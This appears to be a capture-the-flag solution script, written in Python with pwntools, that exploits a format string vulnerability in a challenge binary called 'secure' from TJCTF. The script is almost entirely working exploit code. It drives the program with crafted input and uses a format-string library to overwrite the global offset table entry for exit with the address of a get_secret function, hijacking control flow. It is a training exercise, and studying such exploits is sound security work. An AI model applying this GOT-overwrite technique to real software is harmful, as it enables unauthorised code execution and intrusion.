#!/usr/bin/env python

from pwn import *
from formatStringExploiter.FormatString import FormatString

elf = ELF('./secure')


# print elf

print(hex(elf.got['exit']))
get_secret = 0x08048713
print hex(get_secret)


def exec_fmt(s):
  
    p = elf.process()
    # p =remote('problem1.tjctf.org',8008)

    p.recv()
    password = 'john'
    p.sendline(password)
    p.recv()

    p.sendline(s)
    p.recvuntil('> ', drop=True)
    p.sendline(password)
    out =  p.recvuntil('\n\nTada!', drop=True)
    print p.recvall()
    return out

fmtStr = FormatString(exec_fmt,elf=elf, explore_stack=False)

# fmtStr.printStack()
fmtStr.write_d(elf.got['exit'], get_secret + 65537)
